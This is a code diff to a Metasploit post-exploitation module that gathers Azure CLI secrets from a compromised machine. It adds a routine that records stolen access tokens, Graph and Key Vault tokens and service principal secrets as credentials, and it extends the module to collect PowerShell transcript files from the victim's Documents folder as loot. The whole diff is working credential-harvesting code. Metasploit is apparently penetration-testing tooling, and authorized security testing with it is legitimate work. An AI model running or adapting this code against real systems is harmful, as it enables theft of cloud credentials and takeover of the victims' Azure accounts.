@@ -37,6 +37,23 @@ class MetasploitModule < Msf::Post
     )
   end
 
+  def rep_creds(user, pass, type)
+    create_credential_and_login({
+      # must have an IP address, can't be a domain...
+      address: '13.107.246.69', # 'portal.azure.com' https://www.nslookup.io/domains/portal.azure.com/dns-records/ June 24, 2024
+      port: 443,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id,
+      origin_type: :service,
+      private_type: :password, # most are actually JWT (cookies?) but thats not an option
+      private_data: pass,
+      service_name: "azure: #{type}",
+      module_fullname: fullname,
+      username: user,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    })
+  end
+
   def parse_json(data)
     data.strip!
     # remove BOM, https://www.qvera.com/kb/index.php/2410/csv-file-the-start-the-first-header-column-name-can-remove-this
@@ -68,12 +85,15 @@ class MetasploitModule < Msf::Post
     command = 'az --version'
     command = "powershell.exe #{command}" if session.platform == 'windows'
     version_output = cmd_exec(command, 60)
-    version_output.match(/azure-cli \((.*)\)/)
+    # https://rubular.com/r/wW02GJq51WDa0p
+    version_output.match(/azure-cli\s+[(]?([\d.]+)[)]?/)
   end
 
   def run
     version = get_az_version
-    unless version.nil?
+    if version.nil?
+      print_status('Unable to determine az cli version')
+    else
       print_status("az cli version: #{version[1]}")
     end
     profile_table = Rex::Text::Table.new(
@@ -129,6 +149,14 @@ class MetasploitModule < Msf::Post
         results = process_context_contents(data)
         results.each do |result|
           context_table << result
+          next if result[0].blank?
+          next unless framework.db.active
+
+          rep_creds(result[0], result[2], 'Access Token') unless result[2].blank?
+          rep_creds(result[0], result[3], 'Graph Access Token') unless result[3].blank?
+          rep_creds(result[0], result[4], 'MS Graph Access Token') unless result[4].blank?
+          rep_creds(result[0], result[5], 'Key Vault Token') unless result[5].blank?
+          rep_creds(result[0], result[6], 'Principal Secret') unless result[6].blank?
         end
       end
 
@@ -178,6 +206,24 @@ class MetasploitModule < Msf::Post
         next unless data
 
         loot = store_loot 'azure.console_history.txt', 'text/plain', session, data, possible_location, 'Azure CLI Profile'
+        print_good "    #{possible_location} stored in #{loot}"
+
+        results = print_consolehost_history(data)
+        results.each do |result|
+          print_good(result)
+        end
+      end
+
+      # https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.4#description
+      vprint_status('  Checking for powershell transcript files')
+      dir("#{user_directory}/Documents").each do |file_name|
+        next unless file_name =~ /PowerShell_transcript\.[\w_]+\.[^.]+\.\d+\.txt/
+
+        possible_location = "#{user_directory}/Documents/#{file_name}"
+        data = read_file(possible_location)
+        next unless data
+
+        loot = store_loot 'azure.transcript.txt', 'text/plain', session, data, possible_location, 'Powershell Transcript'
         print_good "    #{possible_location} stored in #{loot}"
 
         results = print_consolehost_history(data)
